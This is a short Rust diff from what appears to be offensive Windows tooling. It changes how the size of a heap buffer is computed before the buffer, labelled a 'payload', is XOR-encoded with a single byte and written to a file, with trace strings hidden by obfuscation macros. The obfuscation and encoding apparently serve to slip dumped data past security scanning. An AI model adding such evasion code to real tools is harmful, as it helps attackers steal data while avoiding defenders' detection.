@@ -104,7 +104,7 @@ fn main() {
                 &callback_info,
             ) == 1
             {
-                let data = std::slice::from_raw_parts_mut(buf as *mut u8, buf_size);
+                let data = std::slice::from_raw_parts_mut(buf as *mut u8, HeapSize(GetProcessHeap(), 0 as _, buf));
 
                 trace!("{}", obfstr!("xor the payload"));
                 let mut data2 = xor_encode(&data.to_vec(), 0x01);
@@ -117,7 +117,7 @@ fn main() {
                 let status = WriteFile(
                     file_handle,
                     data2.as_mut_ptr() as *mut c_void,
-                    buf_size as u32,
+                    HeapSize(GetProcessHeap(), 0 as _, buf) as u32,
                     &mut nb_bytes_written,
                     ptr::null_mut(),
                 );
